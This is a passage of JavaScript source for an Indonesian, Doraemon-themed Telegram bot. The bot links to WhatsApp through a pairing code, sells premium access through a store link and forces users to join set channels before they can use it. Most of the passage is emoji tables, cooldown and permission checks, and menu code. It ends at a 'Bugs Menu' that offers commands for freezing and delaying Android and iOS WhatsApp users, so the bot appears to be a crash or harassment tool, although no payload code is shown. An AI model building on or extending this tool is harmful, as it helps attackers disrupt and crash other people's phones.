  chess:     "5870920625173828356",
  balloon:   "5361568011020942276",
  confetti:  "5447249559149367631",
  candle:    "5870920625173828356",
  pumpkin:   "5361568011020942276",
  santa:     "5447249559149367631",
  tree2:     "5870920625173828356",
  egg2:      "5361568011020942276",
  heart2:    "5447249559149367631",
  ring:      "5870920625173828356",
  kiss:      "5361568011020942276",
  hug:       "5447249559149367631",
  hand:      "5870920625173828356",
  thumb:     "5361568011020942276",
  clap:      "5447249559149367631",
  pray:      "5870920625173828356",
  muscle:    "5361568011020942276",
  eye:       "5447249559149367631",
  ear:       "5870920625173828356",
  nose:      "5361568011020942276",
  mouth:     "5447249559149367631",
  brain:     "5870920625173828356",
  bone:      "5361568011020942276",
  blood:     "5447249559149367631",
  virus:     "5870920625173828356",
  pill:      "5361568011020942276",
  syringe:   "5447249559149367631",
  dna:       "5870920625173828356",
  atom:      "5361568011020942276",
  magnet:    "5447249559149367631",
  bulb:      "5870920625173828356",
  wrench:    "5361568011020942276",
  hammer:    "5447249559149367631",
  screw:     "5870920625173828356",
  gear:      "5361568011020942276",
  chain:     "5447249559149367631",
  anchor:    "5870920625173828356",
  compass:   "5361568011020942276",
  map:       "5447249559149367631",
  globe:     "5870920625173828356",
  earth:     "5361568011020942276",
  volcano:   "5447249559149367631",
  mountain:  "5870920625173828356",
  wave:      "5361568011020942276",
  drop:      "5447249559149367631",
  flame:     "5870920625173828356",
  zap:       "5361568011020942276",
  boom:      "5447249559149367631",
  magic:     "5870920625173828356",
  wand:      "5361568011020942276",
  crystal:   "5447249559149367631",
  potion:    "5870920625173828356",
  scroll:    "5361568011020942276",
  mirror:    "5447249559149367631",
  clock2:    "5870920625173828356",
  hourglass: "5361568011020942276",
  bell2:     "5447249559149367631",
  horn:      "5870920625173828356",
  drum:      "5361568011020942276",
  guitar:    "5447249559149367631",
  piano:     "5870920625173828356",
  violin:    "5361568011020942276",
  trumpet:   "5447249559149367631",
};

const _emojiKeys = Object.keys(EMOJI_IDS);

function tgEmoji(key, fallback) {
  const id = EMOJI_IDS[key] || EMOJI_IDS.bell;
  const f = fallback || (typeof key === 'string' ? key[0] : "✨");
  return `<tg-emoji emoji-id="${id}">${f}</tg-emoji>`;
}

function pickEmojiFallback(id) {
  if (id === EMOJI_IDS.bell) return "🔔";
  if (id === EMOJI_IDS.dora) return "🥞";
  if (id === EMOJI_IDS.cat)  return "🐱";
  return "✨";
}

function renderEmojiAt(key, idx) {
  const id = EMOJI_IDS[key];
  const char = pickEmojiFallback(id);
  return `<tg-emoji emoji-id="${id}">${char}</tg-emoji>`;
}

const E = {
  bell:  (f = "🔔") => tgEmoji("bell", f),
  dora:  (f = "🥞") => tgEmoji("dora", f),
  cat:   (f = "🐱") => tgEmoji("cat", f),
  ok:    (f = "✅") => tgEmoji("ok", f),
  fail:  (f = "❌") => tgEmoji("fail", f),
  clock: (f = "⏳") => tgEmoji("clock", f),
  lock:  (f = "🔒") => tgEmoji("lock", f),
  key:   (f = "🔑") => tgEmoji("key", f),
  fire:  (f = "🔥") => tgEmoji("fire", f),
  star:  (f = "⭐") => tgEmoji("star", f),
  heart: (f = "❤️") => tgEmoji("heart", f),
  crown: (f = "👑") => tgEmoji("crown", f),
  gem:   (f = "💎") => tgEmoji("gem", f),
  gift:  (f = "🎁") => tgEmoji("gift", f),
  money: (f = "💰") => tgEmoji("money", f),
  rocket:(f = "🚀") => tgEmoji("rocket", f),
  bomb:  (f = "💣") => tgEmoji("bomb", f),
  skull: (f = "💀") => tgEmoji("skull", f),
  ghost: (f = "👻") => tgEmoji("ghost", f),
  robot: (f = "🤖") => tgEmoji("robot", f),
  phone: (f = "📱") => tgEmoji("phone", f),
  laptop:(f = "💻") => tgEmoji("laptop", f),
  camera:(f = "📷") => tgEmoji("camera", f),
  music: (f = "🎵") => tgEmoji("music", f),
  book:  (f = "📚") => tgEmoji("book", f),
  pen:   (f = "🖊️") => tgEmoji("pen", f),
  paper: (f = "📄") => tgEmoji("paper", f),
  save:  (f = "💾") => tgEmoji("save", f),
  cloud: (f = "☁️") => tgEmoji("cloud", f),
  sun:   (f = "☀️") => tgEmoji("sun", f),
  moon:  (f = "🌙") => tgEmoji("moon", f),
  rain:  (f = "🌧️") => tgEmoji("rain", f),
  snow:  (f = "❄️") => tgEmoji("snow", f),
  rainbow:(f= "🌈") => tgEmoji("rainbow", f),
  flower:(f = "🌸") => tgEmoji("flower", f),
  tree:  (f = "🌳") => tgEmoji("tree", f),
  leaf:  (f = "🍃") => tgEmoji("leaf", f),
  apple: (f = "🍎") => tgEmoji("apple", f),
  banana:(f = "🍌") => tgEmoji("banana", f),
  grape: (f = "🍇") => tgEmoji("grape", f),
  bread: (f = "🍞") => tgEmoji("bread", f),
  rice:  (f = "🍚") => tgEmoji("rice", f),
  noodle:(f = "🍜") => tgEmoji("noodle", f),
  fish:  (f = "🐟") => tgEmoji("fish", f),
  meat:  (f = "🥩") => tgEmoji("meat", f),
  egg:   (f = "🥚") => tgEmoji("egg", f),
  milk:  (f = "🥛") => tgEmoji("milk", f),
  coffee:(f = "☕") => tgEmoji("coffee", f),
  tea:   (f = "🍵") => tgEmoji("tea", f),
  water: (f = "💧") => tgEmoji("water", f),
  beer:  (f = "🍺") => tgEmoji("beer", f),
  wine:  (f = "🍷") => tgEmoji("wine", f),
  cup:   (f = "🥤") => tgEmoji("cup", f),
  fork:  (f = "🍴") => tgEmoji("fork", f),
  knife: (f = "🔪") => tgEmoji("knife", f),
  plate: (f = "🍽️") => tgEmoji("plate", f),
  timer: (f = "⏲️") => tgEmoji("timer", f),
  calendar:(f="📅") => tgEmoji("calendar", f),
  pin:   (f = "📌") => tgEmoji("pin", f),
  flag:  (f = "🚩") => tgEmoji("flag", f),
  check: (f = "✔️") => tgEmoji("check", f),
  cross: (f = "✖️") => tgEmoji("cross", f),
  question:(f="❓") => tgEmoji("question", f),
  info:  (f = "ℹ️") => tgEmoji("info", f),
  warn:  (f = "⚠️") => tgEmoji("warn", f),
  error: (f = "🚫") => tgEmoji("error", f),
  success:(f= "🎉") => tgEmoji("success", f),
  smile: (f = "😊") => tgEmoji("smile", f),
  laugh: (f = "😂") => tgEmoji("laugh", f),
  wink:  (f = "😉") => tgEmoji("wink", f),
  love:  (f = "😍") => tgEmoji("love", f),
  sad:   (f = "😢") => tgEmoji("sad", f),
  angry: (f = "😠") => tgEmoji("angry", f),
  cry:   (f = "😭") => tgEmoji("cry", f),
  sleep: (f = "😴") => tgEmoji("sleep", f),
  think: (f = "🤔") => tgEmoji("think", f),
  cool:  (f = "😎") => tgEmoji("cool", f),
  party: (f = "🥳") => tgEmoji("party", f),
  sparkle:(f= "✨") => tgEmoji("sparkle", f),
  diamond:(f= "💠") => tgEmoji("diamond", f),
  trophy:(f = "🏆") => tgEmoji("trophy", f),
  medal: (f = "🥇") => tgEmoji("medal", f),
  rank:  (f = "📊") => tgEmoji("rank", f),
  target:(f = "🎯") => tgEmoji("target", f),
  dart:  (f = "🎯") => tgEmoji("dart", f),
  game:  (f = "🎮") => tgEmoji("game", f),
  dice:  (f = "🎲") => tgEmoji("dice", f),
  puzzle:(f = "🧩") => tgEmoji("puzzle", f),
  chess: (f = "♟️") => tgEmoji("chess", f),
  balloon:(f= "🎈") => tgEmoji("balloon", f),
  confetti:(f="🎊") => tgEmoji("confetti", f),
  candle:(f = "🕯️") => tgEmoji("candle", f),
  pumpkin:(f= "🎃") => tgEmoji("pumpkin", f),
  santa: (f = "🎅") => tgEmoji("santa", f),
  ring:  (f = "💍") => tgEmoji("ring", f),
  kiss:  (f = "💋") => tgEmoji("kiss", f),
  hug:   (f = "🤗") => tgEmoji("hug", f),
  hand:  (f = "✋") => tgEmoji("hand", f),
  thumb: (f = "👍") => tgEmoji("thumb", f),
  clap:  (f = "👏") => tgEmoji("clap", f),
  pray:  (f = "🙏") => tgEmoji("pray", f),
  muscle:(f = "💪") => tgEmoji("muscle", f),
  eye:   (f = "👁️") => tgEmoji("eye", f),
  ear:   (f = "👂") => tgEmoji("ear", f),
  nose:  (f = "👃") => tgEmoji("nose", f),
  mouth: (f = "👄") => tgEmoji("mouth", f),
  brain: (f = "🧠") => tgEmoji("brain", f),
  bone:  (f = "🦴") => tgEmoji("bone", f),
  blood: (f = "🩸") => tgEmoji("blood", f),
  virus: (f = "🦠") => tgEmoji("virus", f),
  pill:  (f = "💊") => tgEmoji("pill", f),
  syringe:(f= "💉") => tgEmoji("syringe", f),
  dna:   (f = "🧬") => tgEmoji("dna", f),
  atom:  (f = "⚛️") => tgEmoji("atom", f),
  magnet:(f = "🧲") => tgEmoji("magnet", f),
  bulb:  (f = "💡") => tgEmoji("bulb", f),
  wrench:(f = "🔧") => tgEmoji("wrench", f),
  hammer:(f = "🔨") => tgEmoji("hammer", f),
  screw: (f = "🔩") => tgEmoji("screw", f),
  gear:  (f = "⚙️") => tgEmoji("gear", f),
  chain: (f = "⛓️") => tgEmoji("chain", f),
  anchor:(f = "⚓") => tgEmoji("anchor", f),
  compass:(f= "🧭") => tgEmoji("compass", f),
  map:   (f = "🗺️") => tgEmoji("map", f),
  globe: (f = "🌐") => tgEmoji("globe", f),
  earth: (f = "🌍") => tgEmoji("earth", f),
  volcano:(f= "🌋") => tgEmoji("volcano", f),
  mountain:(f="⛰️") => tgEmoji("mountain", f),
  wave:  (f = "🌊") => tgEmoji("wave", f),
  drop:  (f = "💧") => tgEmoji("drop", f),
  flame: (f = "🔥") => tgEmoji("flame", f),
  zap:   (f = "⚡") => tgEmoji("zap", f),
  boom:  (f = "💥") => tgEmoji("boom", f),
  magic: (f = "🪄") => tgEmoji("magic", f),
  wand:  (f = "🪄") => tgEmoji("wand", f),
  crystal:(f= "🔮") => tgEmoji("crystal", f),
  potion:(f = "🧪") => tgEmoji("potion", f),
  scroll:(f = "📜") => tgEmoji("scroll", f),
  mirror:(f = "🪞") => tgEmoji("mirror", f),
  hourglass:(f="⌛") => tgEmoji("hourglass", f),
  bell2: (f = "🔔") => tgEmoji("bell2", f),
  horn:  (f = "📯") => tgEmoji("horn", f),
  drum:  (f = "🥁") => tgEmoji("drum", f),
  guitar:(f = "🎸") => tgEmoji("guitar", f),
  piano: (f = "🎹") => tgEmoji("piano", f),
  violin:(f = "🎻") => tgEmoji("violin", f),
  trumpet:(f= "🎺") => tgEmoji("trumpet", f),
};

const Q = (text) => `<blockquote>${text}</blockquote>`;

const STYLES = ["primary", "danger", "success"];
let _styleIdx = 0;
function nextStyle() {
  const s = STYLES[_styleIdx++ % 3];
  return s;
}

function btn(text, cb, emojiId) {
  return Markup.button.callback(text, cb, false, {
    icon_custom_emoji_id: emojiId || EMOJI_IDS.bell,
    style: nextStyle(),
  });
}
function btnUrl(text, url, emojiId) {
  return Markup.button.url(text, url, false, {
    icon_custom_emoji_id: emojiId || EMOJI_IDS.bell,
    style: nextStyle(),
  });
}

const T = {
  greet:        `${E.bell()} Halo Nobita! Selamat datang di kantong ajaib ${E.dora()}`,
  ready:        `${E.dora()} Dorayaki udah siap, mau minta apa hari ini?`,
  success:      `${E.success()} Berhasil, Nobita! Dorayaki buat kamu ${E.dora()}`,
  fail:         `${E.fail()} Aduh Nobita, gagal nih... coba lagi ya ${E.sad()}`,
  loading:      `${E.clock()} Tunggu ya, aku ambil dari kantong ajaib dulu~ ${E.cat()}`,
  ownerOnly:    `${E.fail()} Eits, ini cuma buat Dorami & Dekisugi! ${E.lock()}`,
  adminOnly:    `${E.fail()} Khusus admin & owner ya Nobita~ ${E.lock()}`,
  premiumOnly:  `${E.fail()} Ini fitur kantong ajaib — khusus member premium Nobita! ${E.dora()}`,
  cooldown:     (s) => `${E.clock()} Sabar Nobita, ${s} detik lagi pintu ajaibnya kebuka ${E.hourglass()}`,
  waNotConn:    `${E.fail()} Doraemon belum nyambung ke WhatsApp, Nobita!\n${E.key()} Ketik /addsender dulu ya`,
  banGroup:     `${E.success()} Grup dibanned! Doraemon ngamuk ${E.angry()}`,
  forceLock:    `${E.lock()} Pintu Ajaib Terkunci!`,
  forceDesc:    `Sebelum masuk ke kantong ajaib, Nobita harus join channel resmi dulu ya~\nSetelah join, klik tombol CHECK ${E.bell()}`,
  verifyOk:     (n) => `${E.success()} ${n}, verifikasi berhasil! Ketik /start buat mulai ${E.dora()}`,
  verifyFail:   (n) => `${E.fail()} ${n}, kamu belum join channel/grup yang diwajibkan ${E.sad()}`,
  waConnected:  `${E.ok()} Terhubung (Doraemon siap!) ${E.rocket()}`,
  waDisconn:    `${E.fail()} Tidak Terhubung ${E.ghost()}`,
  pairingOk:    (code) => `${E.ok()} Kode Pairing Doraemon:\n<code>${code}</code>\n\n${E.key()} Cara masukin:\n1. Buka WhatsApp\n2. Perangkat Tertaut\n3. Tautkan perangkat\n4. Masukkan kode di atas`,
  pairingFail:  (e) => `${E.fail()} Gagal pairing: ${e}`,
};

bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next();
  if (!ctx.message.text.startsWith('/')) return next();
  const cmd = ctx.message.text.split(' ')[0].replace('/', '').toLowerCase();
  if (cmd === 'setcd') return next();
  if (globalCooldownSeconds <= 0) return next();
  const userId = ctx.from.id;
  const now = Date.now();
  const lastUsed = userLastCommandTime.get(userId) || 0;
  const elapsed = now - lastUsed;
  const requiredWait = globalCooldownSeconds * 1000;
  if (elapsed < requiredWait) {
    const remaining = Math.ceil((requiredWait - elapsed) / 1000);
    await ctx.reply(T.cooldown(remaining), { parse_mode: 'HTML' });
    return;
  }
  userLastCommandTime.set(userId, now);
  return next();
});

const checkAdmin = async (ctx, next) => {
  const userId = ctx.from?.id?.toString();
  if (global.isAdmin(userId)) return next();
  return ctx.reply(T.adminOnly, { parse_mode: 'HTML' });
};

const checkOwner = (ctx, next) => {
  if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.reply(T.ownerOnly, { parse_mode: 'HTML' });
  }
  next();
};

const checkPremium = async (ctx, next) => {
  const userId = ctx.from?.id?.toString();
  const chatId = ctx.chat?.id?.toString();
  if (global.isPremiumUser(userId) || global.isPremiumGroup(chatId)) return next();
  return ctx.reply(T.premiumOnly, { parse_mode: 'HTML' });
};

let currentUniformColor = 'primary';
const uniformColors = ['primary', 'danger', 'success'];
function getUniformStyle() {
  currentUniformColor = uniformColors[(uniformColors.indexOf(currentUniformColor) + 1) % uniformColors.length];
  return currentUniformColor;
}

const autoColorMessages = new Map();
const lastUpdateMap = new Map();

const updateButtonColors = async (chatId, messageId) => {
    if (!autoColorMessages.has(chatId) || autoColorMessages.get(chatId) !== messageId) return;
    if (Date.now() - (lastUpdateMap.get(chatId) || 0) < 2500) return;
    try {
        const warna = getUniformStyle();
        await bot.telegram.editMessageReplyMarkup(chatId, messageId, null, {
            inline_keyboard: [
                [
                    { text: 'Menu', callback_data: 'action_winner', style: warna, icon_custom_emoji_id: EMOJI_IDS.bell },
                    { text: 'Settings', callback_data: 'action_tools', style: warna, icon_custom_emoji_id: EMOJI_IDS.dora }
                ],
                [
                    { text: 'CREWY Store', url: 'https://t.me/senzystur', style: warna, icon_custom_emoji_id: EMOJI_IDS.cat }
                ]
            ]
        });
        lastUpdateMap.set(chatId, Date.now());
    } catch (e) {
        if (e.description?.includes('429')) {
            const wait = (e.description.match(/retry after (\d+)/)?.[1] || 5) * 1000;
            lastUpdateMap.set(chatId, Date.now() + wait - 2500);
        } else if (e.description?.includes('message to edit not found')) {
            autoColorMessages.delete(chatId);
        }
    }
};

setInterval(() => {
    for (const [chatId, msgId] of autoColorMessages.entries()) {
        updateButtonColors(chatId, msgId);
    }
}, 4000);

async function safeEditMessageCaption(ctx, newCaption, extra) {
    try {
        await ctx.editMessageCaption(newCaption, extra);
    } catch (e) {
        if (e.description?.includes('message is not modified')) return;
        console.error('❌ Gagal edit caption:', e.message);
    }
}

async function safeEditMessageText(ctx, newText, extra) {
    try {
        await ctx.editMessageText(newText, extra);
    } catch (e) {
        if (e.description?.includes('message is not modified')) return;
        console.error('❌ Gagal edit text:', e.message);
    }
}

let REQUIRED_CHANNEL_USERNAME = "@setchannel";
const requiredChannelFile = "./requiredChannel.json";

function loadRequiredChannel() {
  try {
    if (fs.existsSync(requiredChannelFile)) {
      const data = JSON.parse(fs.readFileSync(requiredChannelFile));
      if (data?.username) REQUIRED_CHANNEL_USERNAME = data.username;
    }
  } catch (e) { console.log("Failed load channel:", e.message); }
}
function saveRequiredChannel() {
  try { fs.writeFileSync(requiredChannelFile, JSON.stringify({ username: REQUIRED_CHANNEL_USERNAME }, null, 2)); }
  catch (e) { console.log("Failed save channel:", e.message); }
}

async function isJoinedChannel(userId) {
  if (!REQUIRED_CHANNEL_USERNAME || REQUIRED_CHANNEL_USERNAME === "@setchannel") return true;
  try {
    const member = await bot.telegram.getChatMember(REQUIRED_CHANNEL_USERNAME, userId);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (err) { console.log("Check join error:", err.message); return false; }
}

async function sendForceSubscribeMessage(ctx) {
  const text = `${Q(`${CREWY_FONT}\n${E.lock()} 𝑨𝑲𝑺𝑬𝑺 𝑻𝑬𝑹𝑲𝑼𝑵𝑪𝑰`)}\n\n${T.forceDesc}`;
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [ btnUrl("JOIN CHANNEL", `https://t.me/${REQUIRED_CHANNEL_USERNAME.replace("@", "")}`, EMOJI_IDS.bell) ],
        [ btn("CHECK", "check_join", EMOJI_IDS.ok) ]
      ]
    }
  };
  try {
    if (ctx.session?.forceSubSent) return;
    if (ctx.session) {
      ctx.session.forceSubSent = true;
      setTimeout(() => { ctx.session.forceSubSent = false; }, 15000);
    }
    return await ctx.reply(text, { parse_mode: "HTML", ...keyboard });
  } catch (err) { console.log("Force sub error:", err.message); }
}

bot.action("check_join", async (ctx) => {
  try { await ctx.answerCbQuery("Checking..."); } catch {}
  const joined = await isJoinedChannel(ctx.from.id);
  const name = ctx.from.first_name || ctx.from.username || "Nobita";
  if (!joined) {
    return ctx.reply(`${E.fail()} ${name}, kamu belum join channel kami ${E.sad()}`, { parse_mode: 'HTML' });
  }
  await safeEditMessageText(ctx, T.verifyOk(name), { parse_mode: 'HTML' });
});

bot.command("setchannel", checkOwner, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply(`${E.fail()} Contoh: <code>/setchannel @NamaChannel</code>`, { parse_mode: 'HTML' });
    let newChannel = args[1];
    if (!newChannel.startsWith("@")) newChannel = "@" + newChannel;
    await bot.telegram.getChat(newChannel);
    REQUIRED_CHANNEL_USERNAME = newChannel;
    saveRequiredChannel();
    return ctx.reply(`${E.ok()} CHANNEL UPDATED\n\nChannel baru: <b>${REQUIRED_CHANNEL_USERNAME}</b> ${E.bell()}`, { parse_mode: 'HTML' });
  } catch (err) {
    return ctx.reply(`${E.fail()} Channel tidak ditemukan. Pastikan bot admin channel dan channel valid.`, { parse_mode: 'HTML' });
  }
});

loadRequiredChannel();

const REQUIRED_MULTI_FILE = './required_multi.json';
let requiredMulti = { mode: null, ch1: null, ch2: null, groupId: null, groupLink: null };
function loadRequiredMulti() { try { if (fs.existsSync(REQUIRED_MULTI_FILE)) requiredMulti = JSON.parse(fs.readFileSync(REQUIRED_MULTI_FILE)); } catch(e) {} }
function saveRequiredMulti() { fs.writeFileSync(REQUIRED_MULTI_FILE, JSON.stringify(requiredMulti, null, 2)); }
loadRequiredMulti();

async function checkMultiJoin(userId) {
  if (!requiredMulti.mode) return null;
  try {
    if (requiredMulti.mode === '1ch') {
      const m = await bot.telegram.getChatMember(requiredMulti.ch1, userId);
      return ['member','administrator','creator'].includes(m.status);
    } else if (requiredMulti.mode === '2ch') {
      const m1 = await bot.telegram.getChatMember(requiredMulti.ch1, userId);
      if (!['member','administrator','creator'].includes(m1.status)) return false;
      const m2 = await bot.telegram.getChatMember(requiredMulti.ch2, userId);
      return ['member','administrator','creator'].includes(m2.status);
    } else if (requiredMulti.mode === 'chXgroup') {
      const m1 = await bot.telegram.getChatMember(requiredMulti.ch1, userId);
      if (!['member','administrator','creator'].includes(m1.status)) return false;
      const m2 = await bot.telegram.getChatMember(requiredMulti.ch2, userId);
      if (!['member','administrator','creator'].includes(m2.status)) return false;
      const mg = await bot.telegram.getChatMember(requiredMulti.groupId, userId);
      return ['member','administrator','creator'].includes(mg.status);
    }
  } catch(e) { return false; }
  return false;
}

async function sendForceMultiMessage(ctx) {
  let text = `${Q(`${CREWY_FONT}\n${E.lock()} 𝑨𝑲𝑺𝑬𝑺 𝑻𝑬𝑹𝑲𝑼𝑵𝑪𝑰`)}\n\n`;
  let buttons = [];
  if (requiredMulti.mode === '1ch') {
    text += `Harus join channel:\n<b>${requiredMulti.ch1}</b>`;
    buttons.push([ btnUrl("JOIN", `https://t.me/${requiredMulti.ch1.replace('@','')}`, EMOJI_IDS.bell) ]);
  } else if (requiredMulti.mode === '2ch') {
    text += `Harus join 2 channel:\n1. <b>${requiredMulti.ch1}</b>\n2. <b>${requiredMulti.ch2}</b>`;
    buttons.push([
      btnUrl("CH 1", `https://t.me/${requiredMulti.ch1.replace('@','')}`, EMOJI_IDS.bell),
      btnUrl("CH 2", `https://t.me/${requiredMulti.ch2.replace('@','')}`, EMOJI_IDS.dora)
    ]);
  } else if (requiredMulti.mode === 'chXgroup') {
    text += `Harus join 2 channel + 1 grup:\n1. <b>${requiredMulti.ch1}</b>\n2. <b>${requiredMulti.ch2}</b>\n3. <b>${requiredMulti.groupId}</b>`;
    buttons.push([
      btnUrl("CH 1", `https://t.me/${requiredMulti.ch1.replace('@','')}`, EMOJI_IDS.bell),
      btnUrl("CH 2", `https://t.me/${requiredMulti.ch2.replace('@','')}`, EMOJI_IDS.dora)
    ]);
    buttons.push([ btnUrl("GRUP", requiredMulti.groupLink || `https://t.me/${requiredMulti.groupId.replace('-100','')}`, EMOJI_IDS.cat) ]);
  }
  buttons.push([ btn("VERIFIKASI", "verify_multi", EMOJI_IDS.ok) ]);
  ctx.reply(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } });
}

bot.action("verify_multi", async (ctx) => {
  await ctx.answerCbQuery();
  const ok = await checkMultiJoin(ctx.from.id);
  const name = ctx.from.first_name || ctx.from.username || "Nobita";
  if (!ok) return ctx.reply(T.verifyFail(name), { parse_mode: 'HTML' });
  await safeEditMessageText(ctx, T.verifyOk(name), { parse_mode: 'HTML' });
});

bot.command('setch', checkOwner, async (ctx) => {
  ctx.session = ctx.session || {};
  ctx.session.setup = { step: 'ch1', mode: '1ch' };
  ctx.reply(`${E.bell()} Kirim username channel (contoh: <code>@channel</code>)`, { parse_mode: 'HTML' });
});

bot.command('set2ch', checkOwner, async (ctx) => {
  ctx.session = ctx.session || {};
  ctx.session.setup = { step: 'ch1', mode: '2ch' };
  ctx.reply(`${E.bell()} Kirim username channel 1`, { parse_mode: 'HTML' });
});

bot.command('setchXgroup', checkOwner, async (ctx) => {
  ctx.session = ctx.session || {};
  ctx.session.setup = { step: 'ch1', mode: 'chXgroup' };
  ctx.reply(`${E.bell()} Kirim username channel 1`, { parse_mode: 'HTML' });
});

bot.command('resetch', checkOwner, async (ctx) => {
  const file = './required_multi.json';
  if (fs.existsSync(file)) fs.unlinkSync(file);
  requiredMulti = { mode: null, ch1: null, ch2: null, groupId: null, groupLink: null };
  if (ctx.session) delete ctx.session.setup;
  ctx.reply(`${E.ok()} Semua pengaturan multi channel direset ${E.bell()}`, { parse_mode: 'HTML' });
});

bot.on('text', async (ctx, next) => {
  if (!ctx.session?.setup) return next();
  const s = ctx.session.setup;
  const txt = ctx.message.text.trim();
  const valid = (u) => u.startsWith('@') ? u : '@'+u;
  if (s.step === 'ch1') {
    let ch1 = valid(txt);
    try { await bot.telegram.getChat(ch1); } catch(e) { return ctx.reply(`${E.fail()} Channel tidak valid.`, { parse_mode: 'HTML' }); }
    requiredMulti.ch1 = ch1; saveRequiredMulti();
    if (s.mode === '1ch') { requiredMulti.mode = '1ch'; saveRequiredMulti(); delete ctx.session.setup; return ctx.reply(`${E.ok()} Sistem 1 channel aktif: ${ch1}`, { parse_mode: 'HTML' }); }
    else { s.step = 'ch2'; return ctx.reply(`${E.bell()} Channel 1: ${ch1}\nKirim username channel 2:`, { parse_mode: 'HTML' }); }
  } else if (s.step === 'ch2') {
    let ch2 = valid(txt);
    try { await bot.telegram.getChat(ch2); } catch(e) { return ctx.reply(`${E.fail()} Channel 2 tidak valid.`, { parse_mode: 'HTML' }); }
    requiredMulti.ch2 = ch2; saveRequiredMulti();
    if (s.mode === '2ch') { requiredMulti.mode = '2ch'; saveRequiredMulti(); delete ctx.session.setup; return ctx.reply(`${E.ok()} Sistem 2 channel aktif:\n${requiredMulti.ch1}\n${ch2}`, { parse_mode: 'HTML' }); }
    else if (s.mode === 'chXgroup') { s.step = 'group'; return ctx.reply(`${E.bell()} Channel 2: ${ch2}\nKirim ID grup (contoh: <code>-100123456789</code>) atau username @grup`, { parse_mode: 'HTML' }); }
  } else if (s.step === 'group') {
    let groupId = txt, link = '';
    try { const chat = await bot.telegram.getChat(groupId); link = chat.invite_link || `https://t.me/${groupId.replace('@','')}`; } catch(e) { return ctx.reply(`${E.fail()} Grup tidak valid. Pastikan bot admin/anggota.`, { parse_mode: 'HTML' }); }
    requiredMulti.groupId = groupId; requiredMulti.groupLink = link; requiredMulti.mode = 'chXgroup'; saveRequiredMulti(); delete ctx.session.setup;
    return ctx.reply(`${E.ok()} Sistem 2 channel + 1 grup aktif:\nCH1: ${requiredMulti.ch1}\nCH2: ${requiredMulti.ch2}\nGRUP: ${groupId}`, { parse_mode: 'HTML' });
  }
  next();
});

// ─── Helper: build button consistently ───
function makeBtn(text, data, emojiKey) {
  const c = getUniformStyle();
  return {
    text,
    callback_data: data,
    style: c,
    icon_custom_emoji_id: EMOJI_IDS[emojiKey]
  };
}

function buildBackKeyboard() {
  const c = getUniformStyle();
  return {
    inline_keyboard: [
      [{ text: 'Kembali', callback_data: 'start_menu', style: c, icon_custom_emoji_id: EMOJI_IDS.bell }]
    ]
  };
}

// ─── Fungsi Start (DITAMBAHKAN) ───
function buildStartCaption(userId, username, senderStatus) {
  return `
${Q(`${CREWY_FONT}\n${E.bell()} 𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑫𝒂𝒕𝒂𝒏𝒈 𝑵𝒐𝒃𝒊𝒕𝒂!`)}
${T.greet}
${T.ready}

${Q(`${CREWY_FONT}\n${E.phone()} 𝑺𝒕𝒂𝒕𝒖𝒔 𝑺𝒆𝒏𝒅𝒆𝒓`)}
${E.key()} ID User : <code>${userId}</code>
${E.cat()} Username : ${username}
${E.rocket()} Status : ${senderStatus}

${Q(`${CREWY_FONT}\n${E.warn()} 𝑷𝒆𝒓𝒊𝒏𝒈𝒂𝒕𝒂𝒏`)}
${E.info()} Gunakan bot ini dengan bijak. Segala penyalahgunaan di luar tanggung jawab developer.
`;
}

function buildStartKeyboard() {
  const c = getUniformStyle();
  return {
    inline_keyboard: [
      [
        { text: 'Menu', callback_data: 'action_winner', style: c, icon_custom_emoji_id: EMOJI_IDS.bell },
        { text: 'Settings', callback_data: 'action_tools', style: c, icon_custom_emoji_id: EMOJI_IDS.dora }
      ],
      [
        { text: 'CREWY Store', url: 'https://t.me/senzystur', style: c, icon_custom_emoji_id: EMOJI_IDS.cat }
      ]
    ]
  };
}

// ─── Middleware ───
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  const text = ctx.message?.text || "";
  const whitelist = ["/start", "/setch", "/set2ch", "/setchXgroup", "/setchannel", "/setcd", "/addsender"];
  if (whitelist.some(cmd => text.startsWith(cmd))) return next();

  if (requiredMulti.mode) {
    const ok = await checkMultiJoin(ctx.from.id);
    if (!ok) {
      if (text.startsWith("/")) return sendForceMultiMessage(ctx);
      return;
    }
  } else {
    const joined = await isJoinedChannel(ctx.from.id);
    if (!joined) {
      if (text.startsWith("/")) return sendForceSubscribeMessage(ctx);
      return;
    }
  }
  return next();
});

// ─── /start ───
bot.command('start', async (ctx) => {
  try {
    let needSubscribe = false;
    if (requiredMulti.mode) {
      const ok = await checkMultiJoin(ctx.from.id);
      if (!ok) needSubscribe = true;
    } else {
      const joined = await isJoinedChannel(ctx.from.id);
      if (!joined) needSubscribe = true;
    }
    if (needSubscribe) {
      if (requiredMulti.mode) return sendForceMultiMessage(ctx);
      return sendForceSubscribeMessage(ctx);
    }

    const RandomBgtJir = "https://ganga--link--ghhzdp9sv8hk.code.run/i/e80ffqtd";
    const user = ctx.from;
    const userId = user.id;
    const username = user.username ? `@${user.username}` : 'Tidak ada';
    const senderStatus = isWhatsAppConnected ? T.waConnected : T.waDisconn;

    const sentMessage = await ctx.replyWithPhoto(RandomBgtJir, {
      caption: buildStartCaption(userId, username, senderStatus),
      parse_mode: 'HTML',
      reply_markup: buildStartKeyboard()
    });

    autoColorMessages.set(ctx.chat.id, sentMessage.message_id);
  } catch (err) {
    console.error('ERROR di /start:', err);
    return ctx.reply(T.fail, { parse_mode: 'HTML' });
  }
});

// ─── Menu handlers ───
bot.action('action_winner', async (ctx) => {
  try {
    const text = `
${Q(`${CREWY_FONT}\n${E.bell()} 𝑩𝒖𝒈𝒔 𝑴𝒆𝒏𝒖`)}
${T.ready}

${Q(`${CREWY_FONT}\n${E.rocket()} 𝑨𝒏𝒅𝒓𝒐𝒊𝒅 𝑩𝒖𝒈𝒔`)}
${E.bomb()} /delaybugs
 ╰⊳ delay status broadcast
${E.snow()} /freezebugs
 ╰⊳ freeze status broadcast

${Q(`${CREWY_FONT}\n${E.cat()} 𝑰𝒑𝒉𝒐𝒏𝒆 𝑩𝒖𝒈𝒔`)}
${E.zap()} /applex
 ╰⊳ ios delay invisible
${E.clock()} /iosdelay
 ╰⊳ delay status broadcast ios

